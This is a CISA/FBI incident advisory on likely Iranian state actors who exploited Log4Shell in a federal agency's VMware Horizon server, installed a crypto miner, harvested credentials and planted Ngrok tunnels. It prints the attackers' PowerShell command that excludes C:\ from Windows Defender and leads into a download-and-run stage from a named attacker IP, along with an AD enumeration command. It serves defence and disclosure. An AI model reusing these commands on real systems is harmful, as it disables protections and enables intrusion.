<p>In April 2022, CISA conducted retrospective analysis using EINSTEIN—an FCEB-wide intrusion detection system (IDS) operated and monitored by CISA—and identified suspected APT activity on an FCEB organization’s network. CISA observed bi-directional traffic between the network and a known malicious IP address associated with exploitation of the Log4Shell vulnerability (CVE-2021-44228) in VMware Horizon servers. In coordination with the FCEB organization, CISA initiated threat hunting incident response activities; however, prior to deploying an incident response team, CISA observed additional suspected APT activity. Specifically, CISA observed HTTPS activity from IP address 51.89.181[.]64 to the organization’s VMware server. Based on trusted third-party reporting, 51.89.181[.]64 is a Lightweight Directory Access Protocol (LDAP) server associated with threat actors exploiting Log4Shell. Following HTTPS activity, CISA observed a suspected LDAP callback on port 443 to this IP address. CISA also observed a DNS query for us‐nation‐ny[.]cf that resolved back to 51.89.181[.]64 when the victim server was returning this Log4Shell LDAP callback to the actors’ server.</p>
<p>CISA assessed that this traffic indicated a confirmed compromise based on the successful callback to the indicator and informed the organization of these findings; the organization investigated the activity and found signs of compromise. As trusted-third party reporting associated Log4Shell activity from 51.89.181[.]64 with lateral movement and targeting of DCs, CISA suspected the threat actors had moved laterally and compromised the organization’s DC.</p>
<p>From mid-June through mid-July 2022, CISA conducted an onsite incident response engagement and determined that the organization was compromised as early as February 2022, by likely Iranian government-sponsored APT actors who installed XMRig crypto mining software. The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies.</p>
<h4><strong>Threat Actor Activity</strong></h4>
<p>In February 2022, the threat actors exploited Log4Shell [<a href="//attack.mitre.org/versions/v11/techniques/T1190/">T1190</a>] for initial access [<a href="//attack.mitre.org/versions/v11/tactics/TA0001/">TA0001</a>] to the organization’s unpatched VMware Horizon server. As part of their initial exploitation, CISA observed a connection to known malicious IP address 182.54.217[.]2 lasting 17.6 seconds.</p>
<p>The actors’ exploit payload ran the following PowerShell command [<a href="//attack.mitre.org/versions/v11/techniques/T1059.001">T1059.001</a>] that added an exclusion rule to Windows Defender [<a href="//attack.mitre.org/versions/v11/techniques/T1562.001">T1562.001</a>]:</p>
<p>powershell try{Add-MpPreference -ExclusionPath 'C:\'; Write-Host 'added-exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc "$BASE64 encoded payload to download next stage and execute it"</p>
<p>The exclusion rule allowlisted the entire c:\drive, enabling threat actors to download tools to the c:\drive without virus scans. The exploit payload then downloaded mdeploy.text from 182.54.217[.]2/mdepoy.txt to C:\users\public\mde.ps1 [<a href="https://attack.mitre.org/versions/v11/techniques/T1105/">T1105</a>]. When executed, mde.ps1 downloaded file.zip from 182.54.217[.]2 and removed mde.ps1 from the disk [<a href="https://attack.mitre.org/versions/v11/techniques/T1070/004/">T1070.004</a>].</p>
<p>file.zip contained XMRig cryptocurrency mining software and associated configuration files.</p>
<ul><li>WinRing0x64.sys – XMRig Miner driver</li>
<li>wuacltservice.exe – XMRig Miner</li>
<li>config.json – XMRig miner configuration</li>
<li>RuntimeBroker.exe – Associated file. This file can create a local user account [<a href="https://attack.mitre.org/versions/v11/techniques/T1136/001/">T1136.001</a>] and tests for internet connectivity by pinging 8.8.8.8 [<a href="https://attack.mitre.org/versions/v11/techniques/T1016/001/">T1016.001</a>]. The exploit payload created a Scheduled Task [<a href="https://attack.mitre.org/versions/v11/techniques/T1053/005">T1053.005</a>] that executed RuntimeBroker.exe daily as SYSTEM. Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access. The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task.</li>
</ul><p>See MAR 10387061-1.v1 for additional information, including IOCs, on these four files.</p>
<p>After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [<a href="https://attack.mitre.org/versions/v11/techniques/T1021/001/">T1021.001</a>] and the built-in Windows user account DefaultAccount [<a href="https://attack.mitre.org/versions/v11/techniques/T1078/001/">T1078.001</a>] to move laterally [<a href="https://attack.mitre.org/versions/v11/tactics/TA0008/">TA0008</a>] to a VMware VDI-KMS host. Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.]sh server associated with 144.76.136[.]153. The actors downloaded the following tools:</p>
<ul><li><a href="https://attack.mitre.org/software/S0029/">PsExec</a> – a Microsoft signed tool for system administrators.</li>
<li><a href="https://attack.mitre.org/versions/v11/software/S0002/">Mimikatz</a> – a credential theft tool.</li>
<li><a href="https://attack.mitre.org/versions/v11/software/S0508/">Ngrok</a> – a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok[.]io. CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments. Ngrok is known to be used for malicious purposes.[<a href="https://attack.mitre.org/versions/v11/software/S0508/">1</a>]</li>
</ul><p>The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account [<a href="https://attack.mitre.org/versions/v11/techniques/T1136/002/">T1136.002</a>]. Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network. Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files. The threat actors were able to implant Ngrok on multiple hosts to ensure Ngrok’s persistence should they lose access to a machine during a routine reboot. The actors were able to proxy [<a href="https://attack.mitre.org/versions/v11/techniques/T1136/002/">T1090</a>] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok[.]com and korgn.su.lennut[.]com (the prior domain in reverse). It is possible, but was not observed, that the threat actors configured a custom domain, or used other Ngrok tunnel domains, wildcarded here as *.ngrok[.]com, *.ngrok[.]io, ngrok.*.tunnel[.]com, or korgn.*.lennut[.]com.</p>
<p>Once the threat actors established a deep foothold in the network and moved laterally to the domain controller, they executed the following PowerShell command on the Active Directory to obtain a list of all machines attached to the domain [<a href="https://attack.mitre.org/versions/v11/techniques/T1018">T1018</a>]:</p>
<p>Powershell.exe get-adcomputer -filter * -properties * | select name,operatingsystem,ipv4address &gt;</p>
<p>The threat actors also changed the password for the local administrator account [<a href="https://attack.mitre.org/versions/v11/techniques/T1098/">T1098</a>] on several hosts as a backup should the rogue domain administrator account get detected and terminated. Additionally, the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process [<a href="https://attack.mitre.org/versions/v11/techniques/T1003/001">T1003.001</a>] with task manager but this was stopped by additional anti-virus the FCEB organization had installed.</p>
<h3>MITRE ATT&CK TACTICS AND TECHNIQUES</h3>
<p>See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations. For additional mitigations, see the Mitigations section.</p>
<table class="Table"><caption><em>Table 1: Cyber Threat Actors ATT&CK Techniques for Enterprise</em></caption>
<tbody><tr><td>
<p>Initial Access</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
<td>
<p>Recommendations</p>
</td>
</tr><tr><td>
<p>Exploit Public-Facing Application</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1190/">T1190</a></p>
</td>
<td>
<p>The actors exploited Log4Shell for initial access to the organization’s VMware Horizon server.</p>
</td>
<td>
<p>Mitigation/Detection: Use a firewall or web-application firewall and enable logging to prevent and detect potential Log4Shell exploitation attempts [<a href="https://attack.mitre.org/versions/v11/mitigations/M1050">M1050</a>].</p>
<p>Mitigation: Perform regular vulnerability scanning to detect Log4J vulnerabilities and update Log4J software using vendor provided patches [<a href="https://attack.mitre.org/versions/v11/mitigations/M1016">M1016</a>],[<a href="https://attack.mitre.org/versions/v11/mitigations/M1051">M1051</a>].</p>
</td>
</tr><tr><td>
<p>Execution</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
<td>
<p>Recommendation</p>
</td>
</tr><tr><td>
<p>Command and Scripting Interpreter: PowerShell</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1059/001/">T1059.001</a></p>
</td>
<td>
<p>The actors ran PowerShell commands that added an exclusion rule to Windows Defender.</p>
<p>The actors executed PowerShell on the AD to obtain a list of machines on the domain.</p>
</td>
<td>
<p>Mitigation: Disable or remove PowerShell for non-administrative users [<a href="https://attack.mitre.org/versions/v11/mitigations/M1042">M1042</a>],[<a href="https://attack.mitre.org/versions/v11/mitigations/M1026">M1026</a>] or enable code-signing to execute only signed scripts [<a href="https://attack.mitre.org/versions/v11/mitigations/M1045">M1045</a>].</p>
<p>Mitigation: Employ anti-malware to automatically detect and quarantine malicious scripts [<a href="https://attack.mitre.org/versions/v11/mitigations/M1049">M1049</a>].</p>
</td>
</tr><tr><td>
<p>Persistence</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
<td>
<p>Recommendations</p>
</td>
</tr><tr><td>
<p>Account Manipulation</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1098/">T1098</a></p>
</td>
<td>
<p>The actors changed the password for the local administrator account on several hosts.</p>
</td>
<td>
<p>Mitigation: Use multifactor authentication for user and privileged accounts [<a href="https://attack.mitre.org/versions/v11/mitigations/M1032">M1032</a>].</p>
<p>Detection: Monitor events for changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728, and 4670. Monitor for modification of accounts in correlation with other suspicious activity [<a href="https://attack.mitre.org/versions/v11/datasources/DS0002">DS0002</a>].</p>
</td>
</tr><tr><td>
<p>Create Account: Local Account</p>
</td>
<td>
<p><a href="https://attack.mitre.org/techniques/T1136/001/">T1136.001</a></p>
</td>
<td>
<p>The actors’ malware can create local user accounts.</p>
</td>
<td>
<p>Mitigation: Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts.</p>
<p>Detection: Monitor executed commands and arguments for actions that are associated with local account creation, such as net user /add , useradd, and dscl -create [<a href="https://attack.mitre.org/datasources/DS0017/#Command%20Execution">DS0017</a>].</p>
<p>Detection: Enable logging for new user creation [<a href="https://attack.mitre.org/versions/v11/datasources/DS0002">DS0002</a>].</p>
</td>
</tr><tr><td>
<p>Create Account: Domain Account</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1136/002/">T1136.002</a></p>
</td>
<td>
<p>The actors used Mimikatz to create a rogue domain administrator account.</p>
</td>
<td>
<p>Mitigation: Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts.</p>
<p>Detection: Enable logging for new user creation, especially domain administrator accounts [<a href="https://attack.mitre.org/versions/v11/datasources/DS0002">DS0002</a>].</p>
</td>
</tr><tr><td>
<p>Scheduled Task/Job: Scheduled Task</p>
</td>
<td>
<p><a></a><a href="https://attack.mitre.org/versions/v11/techniques/T1053/005/">T1053.005</a></p>
</td>
<td>
<p>The actors’ exploit payload created Scheduled Task RuntimeBrokerService.exe, which executed RuntimeBroker.exe daily as SYSTEM.</p>
</td>
<td>
<p>Mitigation: Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM [<a href="https://attack.mitre.org/versions/v11/mitigations/M1028">M1028</a>].</p>
<p>Detection: Monitor for newly constructed processes and/or command-lines that execute from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows [<a href="https://attack.mitre.org/versions/v11/datasources/DS0009">DS0009</a>]</p>
<p>Detection: Monitor for newly constructed scheduled jobs by enabling the Microsoft-Windows-TaskScheduler/Operational setting within the event logging service [<a href="https://attack.mitre.org/versions/v11/datasources/DS0003">DS0003</a>].</p>
</td>
</tr><tr><td>
<p>Valid Accounts: Default Accounts</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1078/001/">T1078.001</a></p>
</td>
<td>
<p>The actors used built-in Windows user account DefaultAccount.</p>
</td>
<td>
<p>Mitigation: Change default usernames and passwords immediately after the installation and before deployment to a production environment [<a href="https://attack.mitre.org/versions/v11/mitigations/M1027">M1027</a>].</p>
<p>Detection: Develop rules to monitor logon behavior across default accounts that have been activated or logged into [<a href="https://attack.mitre.org/versions/v11/datasources/DS0028">DS0028</a>].</p>
</td>
</tr><tr><td>
<p>Defense Evasion</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
<td>
<p>Recommendations</p>
</td>
</tr><tr><td>
<p>Impair Defenses: Disable or Modify Tools</p>
<p>            </p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1562/001/">T1562.001</a></p>
</td>
<td>
<p>The actors added an exclusion rule to Windows Defender. The tool allowlisted the entire c:\drive, enabling the actors to bypass virus scans for tools they downloaded to the c:\drive.</p>
<p>The actors manually disabled Windows Defender via the GUI.</p>
</td>
<td>
<p>Mitigation: Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services. [<a href="https://attack.mitre.org/versions/v11/mitigations/M1018">M1018</a>].</p>
<p>Detection: Monitor for changes made to Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender [<a href="https://attack.mitre.org/versions/v11/datasources/DS0024">DS0024</a>].</p>
<p>Detection: Monitor for telemetry that provides context for modification or deletion of information related to security software processes or services such as Windows Defender definition files in Windows and System log files in Linux [<a href="https://attack.mitre.org/versions/v11/datasources/DS0013">DS0013</a>].</p>
<p>Detection: Monitor processes for unexpected termination related to security tools/services [<a href="https://attack.mitre.org/versions/v11/datasources/DS0009">DS0009</a>].</p>
</td>
</tr><tr><td>
<p>Indicator Removal on Host: File Deletion</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1070/004/">T1070.004</a></p>
</td>
<td>
<p>The actors removed malicious file mde.ps1 from the dis. </p>
</td>
<td>
<p>Detection: Monitor executed commands and arguments for actions that could be utilized to unlink, rename, or delete files [<a href="https://attack.mitre.org/versions/v11/datasources/DS0017">DS0017</a>].</p>
<p>Detection: Monitor for unexpected deletion of files from the system [<a href="https://attack.mitre.org/versions/v11/datasources/DS0022">DS0022</a>].</p>
</td>
</tr><tr><td>
<p>Credential Access</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
<td>
<p>Recommendations</p>
</td>
</tr><tr><td>
<p>OS Credential Dumping: LSASS Memory</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1003/001">T1003.001</a></p>
</td>
<td>
<p>The actors were observed trying to dump LSASS process.</p>
</td>
<td>
<p>Mitigation: With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping [<a href="https://attack.mitre.org/versions/v11/mitigations/M1043">M1043</a>]</p>
<p>Mitigation: On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing [<a href="https://attack.mitre.org/versions/v11/mitigations/M1040">M1040</a>].</p>
<p>Mitigation: Ensure that local administrator accounts have complex, unique passwords across all systems on the network [<a href="https://attack.mitre.org/versions/v11/mitigations/M1027">M1027</a>].</p>
<p>Detection: Monitor for unexpected processes interacting with LSASS.exe. Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. [<a href="https://attack.mitre.org/versions/v11/datasources/DS0009">DS0009</a>].</p>
<p>Detection: Monitor executed commands and arguments that may attempt to access credential material stored in the process memory of the LSASS [<a href="https://attack.mitre.org/versions/v11/datasources/DS0017">DS0017</a>].</p>
</td>
</tr><tr><td>
<p>Credentials from Password Stores</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1555/">T1555</a></p>
</td>
<td>
<p>The actors used Mimikatz to harvest credentials.</p>
</td>
<td>
<p>Mitigation: Organizations may consider weighing the risk of storing credentials in password stores and web browsers. If system, software, or web browser credential disclosure is a significant concern, technical controls, policy, and user training may be used to prevent storage of credentials in improper locations [<a href="https://attack.mitre.org/versions/v11/mitigations/M1027">M1027</a>].</p>
<p>Detection: Monitor for processes being accessed that may search for common password storage locations to obtain user credentials [<a href="https://attack.mitre.org/versions/v11/datasources/DS0009">DS0009</a>].</p>
<p>Detection: Monitor executed commands and arguments that may search for common password storage locations to obtain user credentials [<a href="https://attack.mitre.org/versions/v11/datasources/DS0017">DS0017</a>].</p>
</td>
</tr><tr><td>
<p>Discovery</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
<td>
<p>Recommendations</p>
</td>
</tr><tr><td>
<p>Remote System Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1018">T1018</a></p>
</td>
<td>
<p>The actors executed a PowerShell command on the AD to obtain a list of all machines attached to the domain.</p>
</td>
<td>
<p>Detection: Monitor executed commands and arguments that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement [<a href="https://attack.mitre.org/versions/v11/datasources/DS0017">DS0017</a>].</p>
<p>Detection: Monitor for newly constructed network connections associated with pings/scans that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement [<a href="https://attack.mitre.org/versions/v11/datasources/DS0029">DS0029</a>].</p>
<p>Detection: Monitor for newly executed processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession [<a href="https://attack.mitre.org/versions/v11/datasources/DS0009">DS0009</a>].</p>
</td>
</tr><tr><td>
<p>System Network Configuration Discovery: Internet Connection Discovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1016/001/">T1016.001</a></p>
</td>
<td>
<p>The actors’ malware tests for internet connectivity by pinging 8.8.8.8.</p>
</td>
<td>
<p>Mitigation: Monitor executed commands, arguments [<a href="https://attack.mitre.org/versions/v11/datasources/DS0017/#Command%20Execution">DS0017</a>] and executed processes (e.g., tracert or ping) [<a href="https://attack.mitre.org/versions/v11/datasources/DS0009/#Process%20Creation">DS0009</a>] that may check for internet connectivity on compromised systems. </p>
</td>
</tr><tr><td>
<p>Lateral Movement</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
<td>
<p>Recommendations</p>
</td>
</tr><tr><td>
<p>Remote Services: Remote Desktop Protocol</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1021/001/">T1021.001</a></p>
</td>
<td>
<p>The actors used RDP to move laterally to multiple hosts on the network.</p>
</td>
<td>
<p>Mitigation: Use MFA for remote logins [<a href="https://attack.mitre.org/versions/v11/mitigations/M1032">M1032</a>].</p>
<p>Mitigation: Disable the RDP service if it is unnecessary [<a href="https://attack.mitre.org/versions/v11/mitigations/M1042">M1042</a>].</p>
<p>Mitigation: Do not leave RDP accessible from the internet. Enable firewall rules to block RDP traffic between network security zones within a network [<a href="https://attack.mitre.org/versions/v11/mitigations/M1030">M1030</a>].</p>
<p>Mitigation: Consider removing the local Administrators group from the list of groups allowed to log in through RDP [<a href="https://attack.mitre.org/versions/v11/mitigations/M1026">M1026</a>].</p>
<p>Detection: Monitor for user accounts logged into systems associated with RDP (ex: Windows EID 4624 Logon Type 10). Other factors, such as access patterns (ex: multiple systems over a relatively short period of time) and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP [<a href="https://attack.mitre.org/versions/v11/datasources/DS0028">DS0028</a>].</p>
</td>
</tr><tr><td>
<p>Command and Control</p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
<td>
<p>Recommendations</p>
</td>
</tr><tr><td>
<p>Proxy</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1090/">T1090</a></p>
</td>
<td>
<p>The actors used Ngrok to proxy RDP connections and to perform command and control.</p>
</td>
<td>
<p>Mitigation: Traffic to known anonymity networks and C2 infrastructure can be blocked through the use of network allow and block lists [<a href="https://attack.mitre.org/versions/v11/mitigations/M1037">M1037</a>].</p>
<p>Detection: Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g., extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure) [<a href="https://attack.mitre.org/versions/v11/datasources/DS0029">DS0029</a>].</p>
</td>
</tr><tr><td>
<p>Ingress Tool Transfer</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v11/techniques/T1105/">T1105</a></p>
</td>
<td>
<p>The actors downloaded malware and multiple tools to the network, including PsExec, Mimikatz, and Ngrok.</p>
</td>
<td>
<p>Mitigation: Employ anti-malware to automatically detect and quarantine malicious scripts [<a href="https://attack.mitre.org/versions/v11/mitigations/M1049">M1049</a>].</p>
<p> </p>
</td>
</tr></tbody></table><p> </p>
<h3>INCIDENT RESPONSE</h3>
<p>If suspected initial access or compromise is detected based on IOCs or TTPs in this CSA, CISA encourages organizations to assume lateral movement by threat actors and investigate connected systems and the DC.</p>
<p>CISA recommends organizations apply the following steps <strong>before applying</strong> any mitigations, including patching.</p>
<ol><li>Immediately isolate affected systems.</li>
<li>Collect and review relevant logs, data, and artifacts. Take a memory capture of the device(s) and a forensic image capture for detailed analysis.</li>
<li>Consider soliciting support from a third-party incident response organization that can provide subject matter expertise to ensure the actor is eradicated from the network and to avoid residual issues that could enable follow-on exploitation.</li>
<li>Report incidents to CISA via CISA’s 24/7 Operations Center (<a href="mailto:report@cisa.gov">report@cisa.gov</a> or 888-282-0870) or <a href="www.fbi.gov/contact-us/field">your local FBI field office</a>, or FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at <a href="mailto:CyWatch@fbi.gov">CyWatch@fbi.gov</a>.<br />
	 </li>
</ol><div>
<h3>Mitigations</h3>
</div>
<p>CISA and FBI recommend implementing the mitigations below and in Table 1 to improve your organization's cybersecurity posture on the basis of threat actor behaviors.</p>
<ul><li><strong>Install updated builds to ensure affected VMware Horizon and UAG systems are updated to the latest version</strong>.
<ul><li>If updates or workarounds were not promptly applied following VMware’s <a href="https://www.vmware.com/security/advisories/VMSA-2021-0028.html">release of updates for Log4Shell in December 2021</a>, treat those VMware Horizon systems as compromised. Follow the pro-active incident response procedures outlined above prior to applying updates. If no compromise is detected, apply these updates as soon as possible.
<ul><li>See VMware Security Advisory <a href="https://www.vmware.com/security/advisories/VMSA-2021-0028.html">VMSA-2021-0028.13</a> and <a href="https://kb.vmware.com/s/article/87073">VMware Knowledge Base (KB) 87073</a> to determine which VMware Horizon components are vulnerable.</li>
<li>Note: Until the update is fully implemented, consider removing vulnerable components from the internet to limit the scope of traffic. While installing the updates, ensure network perimeter access controls are as restrictive as possible.</li>
<li>If upgrading is not immediately feasible, see <a href="https://kb.vmware.com/s/article/87073">KB87073</a> and <a href="https://kb.vmware.com/s/article/87092">KB87092</a> for vendor-provided temporary workarounds. Implement temporary solutions using an account with administrative privileges. Note that these temporary solutions should not be treated as permanent fixes; vulnerable components should be upgraded to the latest build as soon as possible.</li>
<li>Prior to implementing any temporary solution, ensure appropriate backups have been completed.</li>
<li>Verify successful implementation of mitigations by executing the vendor supplied script Horizon_Windows_Log4j_Mitigations.zip without parameters to ensure that no vulnerabilities remain. See <a href="https://kb.vmware.com/s/article/87073">KB87073</a> for details.</li>
</ul></li>
</ul></li>
<li><strong>Keep all software up to date</strong> and prioritize patching <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">known exploited vulnerabilities (KEVs)</a>.</li>
<li><strong>Minimize the internet-facing attack surface</strong> by hosting essential services on a segregated DMZ, ensuring strict network perimeter access controls, and not hosting internet-facing services that are not essential to business operations. Where possible, implement regularly updated web application firewalls (WAF) in front of public-facing services. WAFs can protect against web-based exploitation using signatures and heuristics that are likely to block or alert on malicious traffic.</li>
<li><strong>Use best practices for identity and access management (IAM)</strong> by implementing <a href="https://cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf">phishing resistant multifactor authentication (MFA)</a>, enforcing use of strong passwords, regularly auditing administrator accounts and permissions, and limiting user access through the principle of least privilege. Disable inactive accounts uniformly across the AD, MFA systems, etc.
<ul><li>If using Windows 10 version 1607 or Windows Server 2016 or later, monitor or disable Windows DefaultAccount, also known as the Default System Managed Account (DSMA).</li>
</ul></li>
<li><strong>Audit domain controllers to log</strong> successful Kerberos Ticket Granting Service (TGS) requests and ensure the events are monitored for anomalous activity.  
<ul><li>Secure accounts.</li>
<li>Enforce the principle of least privilege. Administrator accounts should have the minimum permission necessary to complete their tasks.</li>
<li>Ensure there are unique and distinct administrative accounts for each set of administrative tasks.</li>
<li>Create non-privileged accounts for privileged users and ensure they use the non-privileged accounts for all non-privileged access (e.g., web browsing, email access).</li>
</ul></li>
<li><strong>Create a deny list of known compromised credentials</strong> and prevent users from using known-compromised passwords.</li>
<li><strong>Secure credentials by restricting where accounts and credentials can be used</strong> and by using local device credential protection features. 
<ul><li>Use virtualizing solutions on modern hardware and software to ensure credentials are securely stored.</li>
<li>Ensure storage of clear text passwords in LSASS memory is disabled. Note: For Windows 8, this is enabled by default. For more information see Microsoft Security Advisory <a href="https://support.microsoft.com/en-us/topic/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13-2014-93434251-04ac-b7f3-52aa-9f951c14b649">Update to Improve Credentials Protection and Management</a>.</li>
<li>Consider disabling or limiting NTLM and WDigest Authentication.</li>
<li>Implement Credential Guard for Windows 10 and Server 2016 (refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA).</li>
<li>Minimize the AD attack surface to reduce malicious ticket-granting activity. Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ TGS and can be used to obtain hashed credentials that threat actors attempt to crack.<br />
		 </li>
</ul></li>
</ul><h3>VALIDATE SECURITY CONTROLS</h3>
<p>In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA and FBI recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol><li>Select an ATT&CK technique described in this advisory (see table 1).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol><p>CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.</p>
<div>
<h3>References</h3>
</div>
<div class="field--item"><a href="https://attack.mitre.org/versions/v11/software/S0508/">[1] MITRE ATT&CK Version 11: Software – Ngrok</a></div>
<div>
<h3>Revisions</h3>
</div>
<p>Initial Version: November 16, 2022</p>

## pubDate
Tue, 31 Jan 2023 16:32:46 EST
## dc:creator
CISA
## guid
## @isPermaLink
false
## #text
/node/17117
